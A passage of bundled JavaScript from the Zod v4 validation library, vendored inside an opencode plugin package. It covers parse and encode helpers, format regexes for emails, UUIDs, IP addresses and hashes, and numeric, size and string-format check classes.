  const path = _path.map((seg) => typeof seg === "object" ? seg.key : seg);
  for (const seg of path) {
    if (typeof seg === "number")
      segs.push(`[${seg}]`);
    else if (typeof seg === "symbol")
      segs.push(`[${JSON.stringify(String(seg))}]`);
    else if (/[^\w$]/.test(seg))
      segs.push(`[${JSON.stringify(seg)}]`);
    else {
      if (segs.length)
        segs.push(".");
      segs.push(seg);
    }
  }
  return segs.join("");
}
function prettifyError2(error48) {
  const lines = [];
  const issues = [...error48.issues].sort((a, b) => (a.path ?? []).length - (b.path ?? []).length);
  for (const issue3 of issues) {
    lines.push(`\u2716 ${issue3.message}`);
    if (issue3.path?.length)
      lines.push(`  \u2192 at ${toDotPath2(issue3.path)}`);
  }
  return lines.join(`
`);
}

// node_modules/@opencode-ai/plugin/node_modules/zod/v4/core/parse.js
var _parse2 = (_Err) => (schema, value, _ctx, _params) => {
  const ctx = _ctx ? Object.assign(_ctx, { async: false }) : { async: false };
  const result = schema._zod.run({ value, issues: [] }, ctx);
  if (result instanceof Promise) {
    throw new $ZodAsyncError2;
  }
  if (result.issues.length) {
    const e = new (_params?.Err ?? _Err)(result.issues.map((iss) => finalizeIssue2(iss, ctx, config2())));
    captureStackTrace2(e, _params?.callee);
    throw e;
  }
  return result.value;
};
var parse5 = /* @__PURE__ */ _parse2($ZodRealError2);
var _parseAsync2 = (_Err) => async (schema, value, _ctx, params) => {
  const ctx = _ctx ? Object.assign(_ctx, { async: true }) : { async: true };
  let result = schema._zod.run({ value, issues: [] }, ctx);
  if (result instanceof Promise)
    result = await result;
  if (result.issues.length) {
    const e = new (params?.Err ?? _Err)(result.issues.map((iss) => finalizeIssue2(iss, ctx, config2())));
    captureStackTrace2(e, params?.callee);
    throw e;
  }
  return result.value;
};
var parseAsync3 = /* @__PURE__ */ _parseAsync2($ZodRealError2);
var _safeParse2 = (_Err) => (schema, value, _ctx) => {
  const ctx = _ctx ? { ..._ctx, async: false } : { async: false };
  const result = schema._zod.run({ value, issues: [] }, ctx);
  if (result instanceof Promise) {
    throw new $ZodAsyncError2;
  }
  return result.issues.length ? {
    success: false,
    error: new (_Err ?? $ZodError2)(result.issues.map((iss) => finalizeIssue2(iss, ctx, config2())))
  } : { success: true, data: result.value };
};
var safeParse3 = /* @__PURE__ */ _safeParse2($ZodRealError2);
var _safeParseAsync2 = (_Err) => async (schema, value, _ctx) => {
  const ctx = _ctx ? Object.assign(_ctx, { async: true }) : { async: true };
  let result = schema._zod.run({ value, issues: [] }, ctx);
  if (result instanceof Promise)
    result = await result;
  return result.issues.length ? {
    success: false,
    error: new _Err(result.issues.map((iss) => finalizeIssue2(iss, ctx, config2())))
  } : { success: true, data: result.value };
};
var safeParseAsync3 = /* @__PURE__ */ _safeParseAsync2($ZodRealError2);
var _encode2 = (_Err) => (schema, value, _ctx) => {
  const ctx = _ctx ? Object.assign(_ctx, { direction: "backward" }) : { direction: "backward" };
  return _parse2(_Err)(schema, value, ctx);
};
var encode3 = /* @__PURE__ */ _encode2($ZodRealError2);
var _decode2 = (_Err) => (schema, value, _ctx) => {
  return _parse2(_Err)(schema, value, _ctx);
};
var decode3 = /* @__PURE__ */ _decode2($ZodRealError2);
var _encodeAsync2 = (_Err) => async (schema, value, _ctx) => {
  const ctx = _ctx ? Object.assign(_ctx, { direction: "backward" }) : { direction: "backward" };
  return _parseAsync2(_Err)(schema, value, ctx);
};
var encodeAsync3 = /* @__PURE__ */ _encodeAsync2($ZodRealError2);
var _decodeAsync2 = (_Err) => async (schema, value, _ctx) => {
  return _parseAsync2(_Err)(schema, value, _ctx);
};
var decodeAsync3 = /* @__PURE__ */ _decodeAsync2($ZodRealError2);
var _safeEncode2 = (_Err) => (schema, value, _ctx) => {
  const ctx = _ctx ? Object.assign(_ctx, { direction: "backward" }) : { direction: "backward" };
  return _safeParse2(_Err)(schema, value, ctx);
};
var safeEncode3 = /* @__PURE__ */ _safeEncode2($ZodRealError2);
var _safeDecode2 = (_Err) => (schema, value, _ctx) => {
  return _safeParse2(_Err)(schema, value, _ctx);
};
var safeDecode3 = /* @__PURE__ */ _safeDecode2($ZodRealError2);
var _safeEncodeAsync2 = (_Err) => async (schema, value, _ctx) => {
  const ctx = _ctx ? Object.assign(_ctx, { direction: "backward" }) : { direction: "backward" };
  return _safeParseAsync2(_Err)(schema, value, ctx);
};
var safeEncodeAsync3 = /* @__PURE__ */ _safeEncodeAsync2($ZodRealError2);
var _safeDecodeAsync2 = (_Err) => async (schema, value, _ctx) => {
  return _safeParseAsync2(_Err)(schema, value, _ctx);
};
var safeDecodeAsync3 = /* @__PURE__ */ _safeDecodeAsync2($ZodRealError2);
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/core/regexes.js
var exports_regexes2 = {};
__export(exports_regexes2, {
  xid: () => xid3,
  uuid7: () => uuid72,
  uuid6: () => uuid62,
  uuid4: () => uuid42,
  uuid: () => uuid3,
  uppercase: () => uppercase2,
  unicodeEmail: () => unicodeEmail2,
  undefined: () => _undefined4,
  ulid: () => ulid3,
  time: () => time3,
  string: () => string4,
  sha512_hex: () => sha512_hex2,
  sha512_base64url: () => sha512_base64url2,
  sha512_base64: () => sha512_base642,
  sha384_hex: () => sha384_hex2,
  sha384_base64url: () => sha384_base64url2,
  sha384_base64: () => sha384_base642,
  sha256_hex: () => sha256_hex2,
  sha256_base64url: () => sha256_base64url2,
  sha256_base64: () => sha256_base642,
  sha1_hex: () => sha1_hex2,
  sha1_base64url: () => sha1_base64url2,
  sha1_base64: () => sha1_base642,
  rfc5322Email: () => rfc5322Email2,
  number: () => number4,
  null: () => _null4,
  nanoid: () => nanoid3,
  md5_hex: () => md5_hex2,
  md5_base64url: () => md5_base64url2,
  md5_base64: () => md5_base642,
  lowercase: () => lowercase2,
  ksuid: () => ksuid3,
  ipv6: () => ipv63,
  ipv4: () => ipv43,
  integer: () => integer2,
  idnEmail: () => idnEmail2,
  html5Email: () => html5Email2,
  hostname: () => hostname3,
  hex: () => hex3,
  guid: () => guid3,
  extendedDuration: () => extendedDuration2,
  emoji: () => emoji3,
  email: () => email3,
  e164: () => e1643,
  duration: () => duration3,
  domain: () => domain2,
  datetime: () => datetime3,
  date: () => date5,
  cuid2: () => cuid23,
  cuid: () => cuid5,
  cidrv6: () => cidrv63,
  cidrv4: () => cidrv43,
  browserEmail: () => browserEmail2,
  boolean: () => boolean4,
  bigint: () => bigint4,
  base64url: () => base64url3,
  base64: () => base643
});
var cuid5 = /^[cC][^\s-]{8,}$/;
var cuid23 = /^[0-9a-z]+$/;
var ulid3 = /^[0-9A-HJKMNP-TV-Za-hjkmnp-tv-z]{26}$/;
var xid3 = /^[0-9a-vA-V]{20}$/;
var ksuid3 = /^[A-Za-z0-9]{27}$/;
var nanoid3 = /^[a-zA-Z0-9_-]{21}$/;
var duration3 = /^P(?:(\d+W)|(?!.*W)(?=\d|T\d)(\d+Y)?(\d+M)?(\d+D)?(T(?=\d)(\d+H)?(\d+M)?(\d+([.,]\d+)?S)?)?)$/;
var extendedDuration2 = /^[-+]?P(?!$)(?:(?:[-+]?\d+Y)|(?:[-+]?\d+[.,]\d+Y$))?(?:(?:[-+]?\d+M)|(?:[-+]?\d+[.,]\d+M$))?(?:(?:[-+]?\d+W)|(?:[-+]?\d+[.,]\d+W$))?(?:(?:[-+]?\d+D)|(?:[-+]?\d+[.,]\d+D$))?(?:T(?=[\d+-])(?:(?:[-+]?\d+H)|(?:[-+]?\d+[.,]\d+H$))?(?:(?:[-+]?\d+M)|(?:[-+]?\d+[.,]\d+M$))?(?:[-+]?\d+(?:[.,]\d+)?S)?)??$/;
var guid3 = /^([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12})$/;
var uuid3 = (version2) => {
  if (!version2)
    return /^([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[1-8][0-9a-fA-F]{3}-[89abAB][0-9a-fA-F]{3}-[0-9a-fA-F]{12}|00000000-0000-0000-0000-000000000000|ffffffff-ffff-ffff-ffff-ffffffffffff)$/;
  return new RegExp(`^([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-${version2}[0-9a-fA-F]{3}-[89abAB][0-9a-fA-F]{3}-[0-9a-fA-F]{12})$`);
};
var uuid42 = /* @__PURE__ */ uuid3(4);
var uuid62 = /* @__PURE__ */ uuid3(6);
var uuid72 = /* @__PURE__ */ uuid3(7);
var email3 = /^(?!\.)(?!.*\.\.)([A-Za-z0-9_'+\-\.]*)[A-Za-z0-9_+-]@([A-Za-z0-9][A-Za-z0-9\-]*\.)+[A-Za-z]{2,}$/;
var html5Email2 = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/;
var rfc5322Email2 = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
var unicodeEmail2 = /^[^\s@"]{1,64}@[^\s@]{1,255}$/u;
var idnEmail2 = unicodeEmail2;
var browserEmail2 = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/;
var _emoji3 = `^(\\p{Extended_Pictographic}|\\p{Emoji_Component})+$`;
function emoji3() {
  return new RegExp(_emoji3, "u");
}
var ipv43 = /^(?:(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\.){3}(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])$/;
var ipv63 = /^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:))$/;
var cidrv43 = /^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\/([0-9]|[1-2][0-9]|3[0-2])$/;
var cidrv63 = /^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|::|([0-9a-fA-F]{1,4})?::([0-9a-fA-F]{1,4}:?){0,6})\/(12[0-8]|1[01][0-9]|[1-9]?[0-9])$/;
var base643 = /^$|^(?:[0-9a-zA-Z+/]{4})*(?:(?:[0-9a-zA-Z+/]{2}==)|(?:[0-9a-zA-Z+/]{3}=))?$/;
var base64url3 = /^[A-Za-z0-9_-]*$/;
var hostname3 = /^(?=.{1,253}\.?$)[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[-0-9a-zA-Z]{0,61}[0-9a-zA-Z])?)*\.?$/;
var domain2 = /^([a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$/;
var e1643 = /^\+(?:[0-9]){6,14}[0-9]$/;
var dateSource2 = `(?:(?:\\d\\d[2468][048]|\\d\\d[13579][26]|\\d\\d0[48]|[02468][048]00|[13579][26]00)-02-29|\\d{4}-(?:(?:0[13578]|1[02])-(?:0[1-9]|[12]\\d|3[01])|(?:0[469]|11)-(?:0[1-9]|[12]\\d|30)|(?:02)-(?:0[1-9]|1\\d|2[0-8])))`;
var date5 = /* @__PURE__ */ new RegExp(`^${dateSource2}$`);
function timeSource2(args) {
  const hhmm = `(?:[01]\\d|2[0-3]):[0-5]\\d`;
  const regex = typeof args.precision === "number" ? args.precision === -1 ? `${hhmm}` : args.precision === 0 ? `${hhmm}:[0-5]\\d` : `${hhmm}:[0-5]\\d\\.\\d{${args.precision}}` : `${hhmm}(?::[0-5]\\d(?:\\.\\d+)?)?`;
  return regex;
}
function time3(args) {
  return new RegExp(`^${timeSource2(args)}$`);
}
function datetime3(args) {
  const time4 = timeSource2({ precision: args.precision });
  const opts = ["Z"];
  if (args.local)
    opts.push("");
  if (args.offset)
    opts.push(`([+-](?:[01]\\d|2[0-3]):[0-5]\\d)`);
  const timeRegex = `${time4}(?:${opts.join("|")})`;
  return new RegExp(`^${dateSource2}T(?:${timeRegex})$`);
}
var string4 = (params) => {
  const regex = params ? `[\\s\\S]{${params?.minimum ?? 0},${params?.maximum ?? ""}}` : `[\\s\\S]*`;
  return new RegExp(`^${regex}$`);
};
var bigint4 = /^-?\d+n?$/;
var integer2 = /^-?\d+$/;
var number4 = /^-?\d+(?:\.\d+)?/;
var boolean4 = /^(?:true|false)$/i;
var _null4 = /^null$/i;
var _undefined4 = /^undefined$/i;
var lowercase2 = /^[^A-Z]*$/;
var uppercase2 = /^[^a-z]*$/;
var hex3 = /^[0-9a-fA-F]*$/;
function fixedBase642(bodyLength, padding) {
  return new RegExp(`^[A-Za-z0-9+/]{${bodyLength}}${padding}$`);
}
function fixedBase64url2(length) {
  return new RegExp(`^[A-Za-z0-9_-]{${length}}$`);
}
var md5_hex2 = /^[0-9a-fA-F]{32}$/;
var md5_base642 = /* @__PURE__ */ fixedBase642(22, "==");
var md5_base64url2 = /* @__PURE__ */ fixedBase64url2(22);
var sha1_hex2 = /^[0-9a-fA-F]{40}$/;
var sha1_base642 = /* @__PURE__ */ fixedBase642(27, "=");
var sha1_base64url2 = /* @__PURE__ */ fixedBase64url2(27);
var sha256_hex2 = /^[0-9a-fA-F]{64}$/;
var sha256_base642 = /* @__PURE__ */ fixedBase642(43, "=");
var sha256_base64url2 = /* @__PURE__ */ fixedBase64url2(43);
var sha384_hex2 = /^[0-9a-fA-F]{96}$/;
var sha384_base642 = /* @__PURE__ */ fixedBase642(64, "");
var sha384_base64url2 = /* @__PURE__ */ fixedBase64url2(64);
var sha512_hex2 = /^[0-9a-fA-F]{128}$/;
var sha512_base642 = /* @__PURE__ */ fixedBase642(86, "==");
var sha512_base64url2 = /* @__PURE__ */ fixedBase64url2(86);

// node_modules/@opencode-ai/plugin/node_modules/zod/v4/core/checks.js
var $ZodCheck2 = /* @__PURE__ */ $constructor2("$ZodCheck", (inst, def) => {
  var _a2;
  inst._zod ?? (inst._zod = {});
  inst._zod.def = def;
  (_a2 = inst._zod).onattach ?? (_a2.onattach = []);
});
var numericOriginMap2 = {
  number: "number",
  bigint: "bigint",
  object: "date"
};
var $ZodCheckLessThan2 = /* @__PURE__ */ $constructor2("$ZodCheckLessThan", (inst, def) => {
  $ZodCheck2.init(inst, def);
  const origin = numericOriginMap2[typeof def.value];
  inst._zod.onattach.push((inst2) => {
    const bag = inst2._zod.bag;
    const curr = (def.inclusive ? bag.maximum : bag.exclusiveMaximum) ?? Number.POSITIVE_INFINITY;
    if (def.value < curr) {
      if (def.inclusive)
        bag.maximum = def.value;
      else
        bag.exclusiveMaximum = def.value;
    }
  });
  inst._zod.check = (payload) => {
    if (def.inclusive ? payload.value <= def.value : payload.value < def.value) {
      return;
    }
    payload.issues.push({
      origin,
      code: "too_big",
      maximum: def.value,
      input: payload.value,
      inclusive: def.inclusive,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckGreaterThan2 = /* @__PURE__ */ $constructor2("$ZodCheckGreaterThan", (inst, def) => {
  $ZodCheck2.init(inst, def);
  const origin = numericOriginMap2[typeof def.value];
  inst._zod.onattach.push((inst2) => {
    const bag = inst2._zod.bag;
    const curr = (def.inclusive ? bag.minimum : bag.exclusiveMinimum) ?? Number.NEGATIVE_INFINITY;
    if (def.value > curr) {
      if (def.inclusive)
        bag.minimum = def.value;
      else
        bag.exclusiveMinimum = def.value;
    }
  });
  inst._zod.check = (payload) => {
    if (def.inclusive ? payload.value >= def.value : payload.value > def.value) {
      return;
    }
    payload.issues.push({
      origin,
      code: "too_small",
      minimum: def.value,
      input: payload.value,
      inclusive: def.inclusive,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckMultipleOf2 = /* @__PURE__ */ $constructor2("$ZodCheckMultipleOf", (inst, def) => {
  $ZodCheck2.init(inst, def);
  inst._zod.onattach.push((inst2) => {
    var _a2;
    (_a2 = inst2._zod.bag).multipleOf ?? (_a2.multipleOf = def.value);
  });
  inst._zod.check = (payload) => {
    if (typeof payload.value !== typeof def.value)
      throw new Error("Cannot mix number and bigint in multiple_of check.");
    const isMultiple = typeof payload.value === "bigint" ? payload.value % def.value === BigInt(0) : floatSafeRemainder2(payload.value, def.value) === 0;
    if (isMultiple)
      return;
    payload.issues.push({
      origin: typeof payload.value,
      code: "not_multiple_of",
      divisor: def.value,
      input: payload.value,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckNumberFormat2 = /* @__PURE__ */ $constructor2("$ZodCheckNumberFormat", (inst, def) => {
  $ZodCheck2.init(inst, def);
  def.format = def.format || "float64";
  const isInt = def.format?.includes("int");
  const origin = isInt ? "int" : "number";
  const [minimum, maximum] = NUMBER_FORMAT_RANGES2[def.format];
  inst._zod.onattach.push((inst2) => {
    const bag = inst2._zod.bag;
    bag.format = def.format;
    bag.minimum = minimum;
    bag.maximum = maximum;
    if (isInt)
      bag.pattern = integer2;
  });
  inst._zod.check = (payload) => {
    const input = payload.value;
    if (isInt) {
      if (!Number.isInteger(input)) {
        payload.issues.push({
          expected: origin,
          format: def.format,
          code: "invalid_type",
          continue: false,
          input,
          inst
        });
        return;
      }
      if (!Number.isSafeInteger(input)) {
        if (input > 0) {
          payload.issues.push({
            input,
            code: "too_big",
            maximum: Number.MAX_SAFE_INTEGER,
            note: "Integers must be within the safe integer range.",
            inst,
            origin,
            continue: !def.abort
          });
        } else {
          payload.issues.push({
            input,
            code: "too_small",
            minimum: Number.MIN_SAFE_INTEGER,
            note: "Integers must be within the safe integer range.",
            inst,
            origin,
            continue: !def.abort
          });
        }
        return;
      }
    }
    if (input < minimum) {
      payload.issues.push({
        origin: "number",
        input,
        code: "too_small",
        minimum,
        inclusive: true,
        inst,
        continue: !def.abort
      });
    }
    if (input > maximum) {
      payload.issues.push({
        origin: "number",
        input,
        code: "too_big",
        maximum,
        inst
      });
    }
  };
});
var $ZodCheckBigIntFormat2 = /* @__PURE__ */ $constructor2("$ZodCheckBigIntFormat", (inst, def) => {
  $ZodCheck2.init(inst, def);
  const [minimum, maximum] = BIGINT_FORMAT_RANGES2[def.format];
  inst._zod.onattach.push((inst2) => {
    const bag = inst2._zod.bag;
    bag.format = def.format;
    bag.minimum = minimum;
    bag.maximum = maximum;
  });
  inst._zod.check = (payload) => {
    const input = payload.value;
    if (input < minimum) {
      payload.issues.push({
        origin: "bigint",
        input,
        code: "too_small",
        minimum,
        inclusive: true,
        inst,
        continue: !def.abort
      });
    }
    if (input > maximum) {
      payload.issues.push({
        origin: "bigint",
        input,
        code: "too_big",
        maximum,
        inst
      });
    }
  };
});
var $ZodCheckMaxSize2 = /* @__PURE__ */ $constructor2("$ZodCheckMaxSize", (inst, def) => {
  var _a2;
  $ZodCheck2.init(inst, def);
  (_a2 = inst._zod.def).when ?? (_a2.when = (payload) => {
    const val = payload.value;
    return !nullish3(val) && val.size !== undefined;
  });
  inst._zod.onattach.push((inst2) => {
    const curr = inst2._zod.bag.maximum ?? Number.POSITIVE_INFINITY;
    if (def.maximum < curr)
      inst2._zod.bag.maximum = def.maximum;
  });
  inst._zod.check = (payload) => {
    const input = payload.value;
    const size = input.size;
    if (size <= def.maximum)
      return;
    payload.issues.push({
      origin: getSizableOrigin2(input),
      code: "too_big",
      maximum: def.maximum,
      inclusive: true,
      input,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckMinSize2 = /* @__PURE__ */ $constructor2("$ZodCheckMinSize", (inst, def) => {
  var _a2;
  $ZodCheck2.init(inst, def);
  (_a2 = inst._zod.def).when ?? (_a2.when = (payload) => {
    const val = payload.value;
    return !nullish3(val) && val.size !== undefined;
  });
  inst._zod.onattach.push((inst2) => {
    const curr = inst2._zod.bag.minimum ?? Number.NEGATIVE_INFINITY;
    if (def.minimum > curr)
      inst2._zod.bag.minimum = def.minimum;
  });
  inst._zod.check = (payload) => {
    const input = payload.value;
    const size = input.size;
    if (size >= def.minimum)
      return;
    payload.issues.push({
      origin: getSizableOrigin2(input),
      code: "too_small",
      minimum: def.minimum,
      inclusive: true,
      input,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckSizeEquals2 = /* @__PURE__ */ $constructor2("$ZodCheckSizeEquals", (inst, def) => {
  var _a2;
  $ZodCheck2.init(inst, def);
  (_a2 = inst._zod.def).when ?? (_a2.when = (payload) => {
    const val = payload.value;
    return !nullish3(val) && val.size !== undefined;
  });
  inst._zod.onattach.push((inst2) => {
    const bag = inst2._zod.bag;
    bag.minimum = def.size;
    bag.maximum = def.size;
    bag.size = def.size;
  });
  inst._zod.check = (payload) => {
    const input = payload.value;
    const size = input.size;
    if (size === def.size)
      return;
    const tooBig = size > def.size;
    payload.issues.push({
      origin: getSizableOrigin2(input),
      ...tooBig ? { code: "too_big", maximum: def.size } : { code: "too_small", minimum: def.size },
      inclusive: true,
      exact: true,
      input: payload.value,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckMaxLength2 = /* @__PURE__ */ $constructor2("$ZodCheckMaxLength", (inst, def) => {
  var _a2;
  $ZodCheck2.init(inst, def);
  (_a2 = inst._zod.def).when ?? (_a2.when = (payload) => {
    const val = payload.value;
    return !nullish3(val) && val.length !== undefined;
  });
  inst._zod.onattach.push((inst2) => {
    const curr = inst2._zod.bag.maximum ?? Number.POSITIVE_INFINITY;
    if (def.maximum < curr)
      inst2._zod.bag.maximum = def.maximum;
  });
  inst._zod.check = (payload) => {
    const input = payload.value;
    const length = input.length;
    if (length <= def.maximum)
      return;
    const origin = getLengthableOrigin2(input);
    payload.issues.push({
      origin,
      code: "too_big",
      maximum: def.maximum,
      inclusive: true,
      input,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckMinLength2 = /* @__PURE__ */ $constructor2("$ZodCheckMinLength", (inst, def) => {
  var _a2;
  $ZodCheck2.init(inst, def);
  (_a2 = inst._zod.def).when ?? (_a2.when = (payload) => {
    const val = payload.value;
    return !nullish3(val) && val.length !== undefined;
  });
  inst._zod.onattach.push((inst2) => {
    const curr = inst2._zod.bag.minimum ?? Number.NEGATIVE_INFINITY;
    if (def.minimum > curr)
      inst2._zod.bag.minimum = def.minimum;
  });
  inst._zod.check = (payload) => {
    const input = payload.value;
    const length = input.length;
    if (length >= def.minimum)
      return;
    const origin = getLengthableOrigin2(input);
    payload.issues.push({
      origin,
      code: "too_small",
      minimum: def.minimum,
      inclusive: true,
      input,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckLengthEquals2 = /* @__PURE__ */ $constructor2("$ZodCheckLengthEquals", (inst, def) => {
  var _a2;
  $ZodCheck2.init(inst, def);
  (_a2 = inst._zod.def).when ?? (_a2.when = (payload) => {
    const val = payload.value;
    return !nullish3(val) && val.length !== undefined;
  });
  inst._zod.onattach.push((inst2) => {
    const bag = inst2._zod.bag;
    bag.minimum = def.length;
    bag.maximum = def.length;
    bag.length = def.length;
  });
  inst._zod.check = (payload) => {
    const input = payload.value;
    const length = input.length;
    if (length === def.length)
      return;
    const origin = getLengthableOrigin2(input);
    const tooBig = length > def.length;
    payload.issues.push({
      origin,
      ...tooBig ? { code: "too_big", maximum: def.length } : { code: "too_small", minimum: def.length },
      inclusive: true,
      exact: true,
      input: payload.value,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckStringFormat2 = /* @__PURE__ */ $constructor2("$ZodCheckStringFormat", (inst, def) => {
  var _a2, _b;
  $ZodCheck2.init(inst, def);
  inst._zod.onattach.push((inst2) => {
    const bag = inst2._zod.bag;
    bag.format = def.format;
    if (def.pattern) {
      bag.patterns ?? (bag.patterns = new Set);
      bag.patterns.add(def.pattern);
    }
  });
  if (def.pattern)
    (_a2 = inst._zod).check ?? (_a2.check = (payload) => {
      def.pattern.lastIndex = 0;
      if (def.pattern.test(payload.value))
        return;
      payload.issues.push({
        origin: "string",
        code: "invalid_format",
        format: def.format,
        input: payload.value,
        ...def.pattern ? { pattern: def.pattern.toString() } : {},
        inst,
        continue: !def.abort
      });
    });
  else
    (_b = inst._zod).check ?? (_b.check = () => {});
});
var $ZodCheckRegex2 = /* @__PURE__ */ $constructor2("$ZodCheckRegex", (inst, def) => {
  $ZodCheckStringFormat2.init(inst, def);
  inst._zod.check = (payload) => {
    def.pattern.lastIndex = 0;
    if (def.pattern.test(payload.value))
      return;
    payload.issues.push({
      origin: "string",
      code: "invalid_format",
      format: "regex",
      input: payload.value,
      pattern: def.pattern.toString(),
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckLowerCase2 = /* @__PURE__ */ $constructor2("$ZodCheckLowerCase", (inst, def) => {
  def.pattern ?? (def.pattern = lowercase2);
  $ZodCheckStringFormat2.init(inst, def);
});
var $ZodCheckUpperCase2 = /* @__PURE__ */ $constructor2("$ZodCheckUpperCase", (inst, def) => {
  def.pattern ?? (def.pattern = uppercase2);
  $ZodCheckStringFormat2.init(inst, def);
});
var $ZodCheckIncludes2 = /* @__PURE__ */ $constructor2("$ZodCheckIncludes", (inst, def) => {
  $ZodCheck2.init(inst, def);
  const escapedRegex = escapeRegex2(def.includes);
  const pattern = new RegExp(typeof def.position === "number" ? `^.{${def.position}}${escapedRegex}` : escapedRegex);
  def.pattern = pattern;
  inst._zod.onattach.push((inst2) => {
    const bag = inst2._zod.bag;
    bag.patterns ?? (bag.patterns = new Set);
    bag.patterns.add(pattern);
  });
  inst._zod.check = (payload) => {
    if (payload.value.includes(def.includes, def.position))
      return;
    payload.issues.push({
      origin: "string",
      code: "invalid_format",
      format: "includes",
      includes: def.includes,
      input: payload.value,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckStartsWith2 = /* @__PURE__ */ $constructor2("$ZodCheckStartsWith", (inst, def) => {
  $ZodCheck2.init(inst, def);
  const pattern = new RegExp(`^${escapeRegex2(def.prefix)}.*`);
  def.pattern ?? (def.pattern = pattern);
  inst._zod.onattach.push((inst2) => {
    const bag = inst2._zod.bag;
    bag.patterns ?? (bag.patterns = new Set);
    bag.patterns.add(pattern);
  });
  inst._zod.check = (payload) => {
    if (payload.value.startsWith(def.prefix))
      return;
    payload.issues.push({
      origin: "string",
      code: "invalid_format",
      format: "starts_with",
      prefix: def.prefix,
      input: payload.value,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckEndsWith2 = /* @__PURE__ */ $constructor2("$ZodCheckEndsWith", (inst, def) => {
  $ZodCheck2.init(inst, def);
  const pattern = new RegExp(`.*${escapeRegex2(def.suffix)}$`);
  def.pattern ?? (def.pattern = pattern);
  inst._zod.onattach.push((inst2) => {
    const bag = inst2._zod.bag;
    bag.patterns ?? (bag.patterns = new Set);
    bag.patterns.add(pattern);
  });
  inst._zod.check = (payload) => {
    if (payload.value.endsWith(def.suffix))
      return;
    payload.issues.push({
      origin: "string",
      code: "invalid_format",
      format: "ends_with",
      suffix: def.suffix,
      input: payload.value,
      inst,
      continue: !def.abort
    });
  };
});
function handleCheckPropertyResult2(result, payload, property) {
  if (result.issues.length) {
    payload.issues.push(...prefixIssues2(property, result.issues));
  }
}
var $ZodCheckProperty2 = /* @__PURE__ */ $constructor2("$ZodCheckProperty", (inst, def) => {
  $ZodCheck2.init(inst, def);
  inst._zod.check = (payload) => {
    const result = def.schema._zod.run({
      value: payload.value[def.property],
      issues: []
    }, {});
    if (result instanceof Promise) {
      return result.then((result2) => handleCheckPropertyResult2(result2, payload, def.property));
    }
    handleCheckPropertyResult2(result, payload, def.property);
    return;
  };
});
var $ZodCheckMimeType2 = /* @__PURE__ */ $constructor2("$ZodCheckMimeType", (inst, def) => {
  $ZodCheck2.init(inst, def);
  const mimeSet = new Set(def.mime);
  inst._zod.onattach.push((inst2) => {
    inst2._zod.bag.mime = def.mime;
  });
  inst._zod.check = (payload) => {
    if (mimeSet.has(payload.value.type))
      return;
    payload.issues.push({
      code: "invalid_value",
      values: def.mime,
      input: payload.value.type,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckOverwrite2 = /* @__PURE__ */ $constructor2("$ZodCheckOverwrite", (inst, def) => {
  $ZodCheck2.init(inst, def);
  inst._zod.check = (payload) => {
    payload.value = def.tx(payload.value);
  };
});

// node_modules/@opencode-ai/plugin/node_modules/zod/v4/core/doc.js
class Doc2 {
  constructor(args = []) {
    this.content = [];
    this.indent = 0;
    if (this)
      this.args = args;
  }
  indented(fn) {
    this.indent += 1;
    fn(this);
    this.indent -= 1;
  }
  write(arg) {
    if (typeof arg === "function") {
      arg(this, { execution: "sync" });
      arg(this, { execution: "async" });
      return;
    }
    const content = arg;
    const lines = content.split(`
`).filter((x) => x);
    const minIndent = Math.min(...lines.map((x) => x.length - x.trimStart().length));
